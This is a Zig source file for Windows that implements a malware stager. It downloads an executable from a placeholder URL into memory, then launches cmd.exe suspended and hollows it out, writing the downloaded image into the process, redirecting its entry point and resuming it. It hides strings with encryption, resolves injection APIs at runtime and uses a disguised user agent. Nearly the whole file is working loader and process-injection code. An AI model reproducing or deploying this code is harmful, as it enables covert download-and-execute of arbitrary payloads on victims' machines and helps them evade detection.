const std = @import("std");
const builtin = @import("builtin");
const string = @import("strings.zig");
const windows = std.os.windows;
const BOOL = windows.BOOL;
const DWORD = windows.DWORD;
const LPCSTR = ?[*:0]const u8;
const LPSTR = ?[*:0]u8;
const HANDLE = windows.HANDLE;
const LPVOID = *anyopaque;
const LPCVOID = *const anyopaque;
const SIZE_T = usize;
const HMODULE = windows.HMODULE;

const IMAGE_DOS_SIGNATURE = 0x5A4D;
const IMAGE_NT_SIGNATURE = 0x00004550;

const INTERNET_OPEN_TYPE_DIRECT = 1;
const INTERNET_FLAG_RELOAD = 0x80000000;
const HTTP_QUERY_CONTENT_LENGTH = 5;
const HTTP_QUERY_FLAG_NUMBER = 0x20000000;

const CREATE_SUSPENDED = 0x00000004;
const MEM_COMMIT = 0x00001000;
const MEM_RESERVE = 0x00002000;
const MEM_RELEASE = 0x00008000;
const PAGE_READWRITE = 0x04;
const PAGE_READONLY = 0x02;
const PAGE_EXECUTE_READ = 0x20;

const CONTEXT_FULL = 0x00010007;

const IMAGE_DOS_HEADER = extern struct {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [4]u16,
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [10]u16,
    e_lfanew: i32,
};

const IMAGE_FILE_HEADER = extern struct {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
};

const IMAGE_DATA_DIRECTORY = extern struct {
    VirtualAddress: u32,
    Size: u32,
};

const IMAGE_OPTIONAL_HEADER64 = extern struct {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,
    BaseOfCode: u32,
    ImageBase: u64,
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [16]IMAGE_DATA_DIRECTORY,
};

const IMAGE_NT_HEADERS64 = extern struct {
    Signature: u32,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
};

const IMAGE_SECTION_HEADER = extern struct {
    Name: [8]u8,
    VirtualSize: u32,
    VirtualAddress: u32,
    SizeOfRawData: u32,
    PointerToRawData: u32,
    PointerToRelocations: u32,
    PointerToLinenumbers: u32,
    NumberOfRelocations: u16,
    NumberOfLinenumbers: u16,
    Characteristics: u32,
};

const SECURITY_ATTRIBUTES = extern struct {
    nLength: u32,
    lpSecurityDescriptor: ?LPVOID,
    bInheritHandle: BOOL,
};

const STARTUPINFOA = extern struct {
    cb: u32,
    lpReserved: LPSTR,
    lpDesktop: LPSTR,
    lpTitle: LPSTR,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *u8,
    hStdInput: HANDLE,
    hStdOutput: HANDLE,
    hStdError: HANDLE,
};

const PROCESS_INFORMATION = extern struct {
    hProcess: ?HANDLE,
    hThread: ?HANDLE,
    dwProcessId: u32,
    dwThreadId: u32,
};

const CONTEXT = extern struct {
    P1Home: u64,
    P2Home: u64,
    P3Home: u64,
    P4Home: u64,
    P5Home: u64,
    P6Home: u64,
    ContextFlags: u32,
    MxCsr: u32,
    SegCs: u16,
    SegDs: u16,
    SegEs: u16,
    SegFs: u16,
    SegGs: u16,
    SegSs: u16,
    EFlags: u32,
    Dr0: u64,
    Dr1: u64,
    Dr2: u64,
    Dr3: u64,
    Dr6: u64,
    Dr7: u64,
    Rax: u64,
    Rcx: u64,
    Rdx: u64,
    Rbx: u64,
    Rsp: u64,
    Rbp: u64,
    Rsi: u64,
    Rdi: u64,
    R8: u64,
    R9: u64,
    R10: u64,
    R11: u64,
    R12: u64,
    R13: u64,
    R14: u64,
    R15: u64,
    Rip: u64,
    FltSave: [512]u8,
};

const CreateProcessA_t = *const fn (LPCSTR, LPSTR, ?*SECURITY_ATTRIBUTES, ?*SECURITY_ATTRIBUTES, BOOL, DWORD, ?LPVOID, LPCSTR, *STARTUPINFOA, *PROCESS_INFORMATION) BOOL;
const GetThreadContext_t = *const fn (HANDLE, *CONTEXT) BOOL;
const ReadProcessMemory_t = *const fn (HANDLE, LPCVOID, LPVOID, SIZE_T, ?*SIZE_T) BOOL;
const WriteProcessMemory_t = *const fn (HANDLE, LPVOID, LPCVOID, SIZE_T, ?*SIZE_T) BOOL;
const VirtualAllocEx_t = *const fn (HANDLE, ?LPVOID, SIZE_T, DWORD, DWORD) ?LPVOID;
const VirtualFreeEx_t = *const fn (HANDLE, LPVOID, SIZE_T, DWORD) BOOL;
const SetThreadContext_t = *const fn (HANDLE, *CONTEXT) BOOL;
const VirtualProtectEx_t = *const fn (HANDLE, LPVOID, SIZE_T, DWORD, *DWORD) BOOL;

extern "wininet" fn InternetOpenA(lpszAgent: LPCSTR, dwAccessType: DWORD, lpszProxy: LPCSTR, lpszProxyBypass: LPCSTR, dwFlags: DWORD) ?*anyopaque;
extern "wininet" fn InternetOpenUrlA(hInternet: ?*anyopaque, lpszUrl: LPCSTR, lpszHeaders: LPCSTR, dwHeadersLength: DWORD, dwFlags: DWORD, dwContext: DWORD) ?*anyopaque;
extern "wininet" fn InternetReadFile(hFile: ?*anyopaque, lpBuffer: ?LPVOID, dwNumberOfBytesToRead: DWORD, lpdwNumberOfBytesRead: *DWORD) BOOL;
extern "wininet" fn HttpQueryInfoA(hRequest: ?*anyopaque, dwInfoLevel: DWORD, lpBuffer: ?LPVOID, lpdwBufferLength: *DWORD, lpdwIndex: ?*DWORD) BOOL;
extern "wininet" fn InternetCloseHandle(hInternet: ?*anyopaque) BOOL;

extern "kernel32" fn GetModuleHandleA(lpModuleName: LPCSTR) ?HMODULE;
extern "kernel32" fn GetProcAddress(hModule: HMODULE, lpProcName: LPCSTR) ?LPVOID;
extern "kernel32" fn VirtualAlloc(lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) ?LPVOID;
extern "kernel32" fn VirtualFree(lpAddress: ?LPVOID, dwSize: SIZE_T, dwFreeType: DWORD) BOOL;
extern "kernel32" fn TerminateProcess(hProcess: HANDLE, uExitCode: u32) BOOL;
extern "kernel32" fn Sleep(dwMilliseconds: DWORD) void;
extern "kernel32" fn ResumeThread(hThread: HANDLE) DWORD;

fn decryptString(str: []u8) void {
    for (str) |*c| {
        c.* -%= 1;
    }
    std.debug.print("{s}\n", .{str});
}

fn toNullTerminated(allocator: std.mem.Allocator, str: []const u8) ![:0]u8 {
    const result = try allocator.allocSentinel(u8, str.len, 0);
    @memcpy(result[0..str.len], str);
    return result;
}

fn downloadFileToMemory(url: []const u8, fileSize: *usize) ![]u8 {
    const a = std.heap.page_allocator;

    const agent =
        try string.EncryptedString("54bbjhEwqoGUvPaKIhLUHi6tx0rkPMLr").get(a);
    defer a.free(agent);

    const hInternet = InternetOpenA(
        @as(LPCSTR, @ptrCast(agent.ptr)),
        INTERNET_OPEN_TYPE_DIRECT,
        null,
        null,
        0,
    ) orelse return error.InternetOpenFailed;

    defer _ = InternetCloseHandle(hInternet);

    const allocator = std.heap.page_allocator;
    const urlZ = try toNullTerminated(allocator, url);
    defer allocator.free(urlZ);

    const hConnect = InternetOpenUrlA(
        hInternet,
        @as(LPCSTR, @ptrCast(urlZ.ptr)),
        null,
        0,
        INTERNET_FLAG_RELOAD,
        0,
    ) orelse return error.InternetOpenUrlFailed;

    defer _ = InternetCloseHandle(hConnect);

    Sleep(4000);

    var size: DWORD = 0;
    var len: DWORD = @sizeOf(DWORD);

    var dwIndex: DWORD = 0;

    if (HttpQueryInfoA(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &size, &len, &dwIndex) == 0) {
        return error.FailedToGetFileSize;
    }

    const buffer = try allocator.alloc(u8, size);
    errdefer allocator.free(buffer);

    var dwRead: DWORD = 0;
    if (InternetReadFile(hConnect, buffer.ptr, @intCast(size), &dwRead) == 0) {
        allocator.free(buffer);
        return error.FailedToReadFile;
    }

    fileSize.* = dwRead;
    return buffer;
}

fn runPE(image: []const u8, currentFilePath: []const u8, cmdLine: []const u8, outProcessHandle: *HANDLE) !void {
    const kernel32_str = "kernel32.dll";
    const CreateProcessA_str = "CreateProcessA";
    const GetThreadContext_str = "GetThreadContext";
    const ReadProcessMemory_str = "ReadProcessMemory";
    const WriteProcessMemory_str = "WriteProcessMemory";
    const VirtualAllocEx_str = "VirtualAllocEx";
    const VirtualFreeEx_str = "VirtualFreeEx";
    const SetThreadContext_str = "SetThreadContext";
    const VirtualProtectEx_str = "VirtualProtectEx";

    const hKernel32 = GetModuleHandleA(kernel32_str) orelse return error.Kernel32NotFound;

    const pCreateProcessA = @as(CreateProcessA_t, @ptrCast(GetProcAddress(hKernel32, CreateProcessA_str) orelse return error.APINotFound));
    const pGetThreadContext = @as(GetThreadContext_t, @ptrCast(GetProcAddress(hKernel32, GetThreadContext_str) orelse return error.APINotFound));
    const pReadProcessMemory = @as(ReadProcessMemory_t, @ptrCast(GetProcAddress(hKernel32, ReadProcessMemory_str) orelse return error.APINotFound));
    const pWriteProcessMemory = @as(WriteProcessMemory_t, @ptrCast(GetProcAddress(hKernel32, WriteProcessMemory_str) orelse return error.APINotFound));
    const pVirtualAllocEx = @as(VirtualAllocEx_t, @ptrCast(GetProcAddress(hKernel32, VirtualAllocEx_str) orelse return error.APINotFound));
    const pVirtualFreeEx = @as(VirtualFreeEx_t, @ptrCast(GetProcAddress(hKernel32, VirtualFreeEx_str) orelse return error.APINotFound));
    const pSetThreadContext = @as(SetThreadContext_t, @ptrCast(GetProcAddress(hKernel32, SetThreadContext_str) orelse return error.APINotFound));
    const pVirtualProtectEx = @as(VirtualProtectEx_t, @ptrCast(GetProcAddress(hKernel32, VirtualProtectEx_str) orelse return error.APINotFound));

    const dosHeader = @as(*align(1) const IMAGE_DOS_HEADER, @ptrCast(image.ptr));
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return error.InvalidDOSHeader;

    const ntHeader = @as(*align(1) const IMAGE_NT_HEADERS64, @ptrCast(@as([*]const u8, image.ptr) + @as(usize, @intCast(dosHeader.e_lfanew))));
    if (ntHeader.Signature != IMAGE_NT_SIGNATURE) return error.InvalidPEHeader;

    var si: STARTUPINFOA = std.mem.zeroes(STARTUPINFOA);
    si.cb = @sizeOf(STARTUPINFOA);

    var pi: PROCESS_INFORMATION = std.mem.zeroes(PROCESS_INFORMATION);

    const allocator = std.heap.page_allocator;
    const currentFilePathZ = try toNullTerminated(allocator, currentFilePath);
    defer allocator.free(currentFilePathZ);

    const cmdLineZ = try toNullTerminated(allocator, cmdLine);
    defer allocator.free(cmdLineZ);

    if (pCreateProcessA(@as(LPCSTR, @ptrCast(currentFilePathZ.ptr)), @as(LPSTR, @ptrCast(cmdLineZ.ptr)), null, null, 0, CREATE_SUSPENDED, null, null, &si, &pi) == 0) {
        return error.CreateProcessFailed;
    }
    defer {
        if (pi.hProcess) |hProcess| {
            _ = TerminateProcess(hProcess, 0);
        }
    }

    const ctx_ptr = VirtualAlloc(null, @sizeOf(CONTEXT), MEM_COMMIT, PAGE_READWRITE) orelse return error.AllocFailed;
    const ctx = @as(*CONTEXT, @ptrCast(@alignCast(ctx_ptr)));
    defer _ = VirtualFree(ctx, 0, MEM_RELEASE);

    ctx.ContextFlags = CONTEXT_FULL;
    if (pGetThreadContext(pi.hThread orelse return error.InvalidThreadHandle, ctx) == 0) {
        return error.GetThreadContextFailed;
    }

    var remoteImageBase: u64 = 0;
    const pebImageBaseOffset = ctx.Rdx + @sizeOf(usize) * 2;

    if (pReadProcessMemory(pi.hProcess orelse return error.InvalidProcessHandle, @as(LPCVOID, @ptrFromInt(pebImageBaseOffset)), &remoteImageBase, @sizeOf(u64), null) == 0) {
        return error.ReadProcessMemoryFailed;
    }

    _ = pVirtualFreeEx(pi.hProcess orelse return error.InvalidProcessHandle, @as(LPVOID, @ptrFromInt(ntHeader.OptionalHeader.ImageBase)), 0, MEM_RELEASE);

    const pImageBase = pVirtualAllocEx(
        pi.hProcess orelse return error.InvalidProcessHandle,
        @as(LPVOID, @ptrFromInt(ntHeader.OptionalHeader.ImageBase)),
        ntHeader.OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) orelse return error.VirtualAllocExFailed;

    if (pWriteProcessMemory(pi.hProcess orelse return error.InvalidProcessHandle, pImageBase, image.ptr, ntHeader.OptionalHeader.SizeOfHeaders, null) == 0) {
        return error.WriteProcessMemoryFailed;
    }

    const sectionHeadersStart = @as([*]align(1) const u8, image.ptr) + @as(usize, @intCast(dosHeader.e_lfanew)) + @sizeOf(IMAGE_NT_HEADERS64);

    for (0..@as(usize, ntHeader.FileHeader.NumberOfSections)) |i| {
        const section = @as(*align(1) const IMAGE_SECTION_HEADER, @ptrCast(sectionHeadersStart + i * @sizeOf(IMAGE_SECTION_HEADER)));

        const dest = @as(LPVOID, @ptrFromInt(@as(usize, @intFromPtr(pImageBase)) + section.VirtualAddress));
        const src = @as(LPCVOID, @ptrCast(@as([*]const u8, image.ptr) + section.PointerToRawData));

        if (pWriteProcessMemory(pi.hProcess orelse return error.InvalidProcessHandle, dest, src, section.SizeOfRawData, null) == 0) {
            return error.WriteProcessMemoryFailed;
        }

        if (section.Characteristics & 0x00000020 != 0) {
            var oldProt: DWORD = 0;
            _ = pVirtualProtectEx(pi.hProcess orelse return error.InvalidProcessHandle, dest, section.SizeOfRawData, PAGE_EXECUTE_READ, &oldProt);
        }
    }

    const newImageBase = @as(u64, @intFromPtr(pImageBase));
    if (pWriteProcessMemory(pi.hProcess orelse return error.InvalidProcessHandle, @as(LPVOID, @ptrFromInt(pebImageBaseOffset)), &newImageBase, @sizeOf(u64), null) == 0) {
        return error.WriteProcessMemoryFailed;
    }

    ctx.Rcx = @as(u64, @intFromPtr(pImageBase)) + ntHeader.OptionalHeader.AddressOfEntryPoint;

    if (pSetThreadContext(pi.hThread orelse return error.InvalidThreadHandle, ctx) == 0) {
        return error.SetThreadContextFailed;
    }

    _ = ResumeThread(pi.hThread orelse return error.InvalidThreadHandle);

    outProcessHandle.* = pi.hProcess orelse unreachable;
    pi.hProcess = null;
    pi.hThread = null;
}

pub fn init() !void {
    var hand: HANDLE = undefined;
    var fileSize: usize = 0;
    const a = std.heap.page_allocator;

    const rawData = try downloadFileToMemory(
        try string.EncryptedString("https://yoururlhere.tld").get(a),
        &fileSize,
    );
    defer a.free(rawData);

    if (rawData.len == 0) return error.DownloadFailed;

    while (true) {
        runPE(
            rawData,
            try string.EncryptedString("C:\\Windows\\System32\\cmd.exe").get(a),
            try string.EncryptedString("C:\\Windows\\SysWow64\\tree.com test").get(a),
            &hand,
        ) catch continue;
        break;
    }
}
